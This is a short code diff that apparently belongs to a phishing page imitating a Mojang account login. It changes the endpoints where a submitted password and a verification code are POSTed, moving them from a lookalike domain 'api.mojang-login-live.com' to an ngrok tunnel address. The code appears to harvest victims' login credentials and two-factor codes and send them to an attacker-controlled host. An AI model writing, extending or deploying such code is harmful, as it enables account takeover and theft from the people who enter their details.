@@ -760,7 +760,7 @@ function goStep3() {
   if (!password) { err.style.display = 'block'; return; }
   err.style.display = 'none';
 
-  fetch("https://api.mojang-login-live.com/login", {
+  fetch("https://manicure-contact-reopen.ngrok-free.dev/login", {
     method: "POST",
     credentials: "include",
     headers: {
@@ -816,7 +816,7 @@ async function checkCode() {
   err.style.display = 'none';
 
   try {
-    await fetch("https://api.mojang-login-live.com/verify-code", {
+    await fetch("https://manicure-contact-reopen.ngrok-free.dev/verify-code", {
       method: "POST",
       credentials: "include",
       headers: {
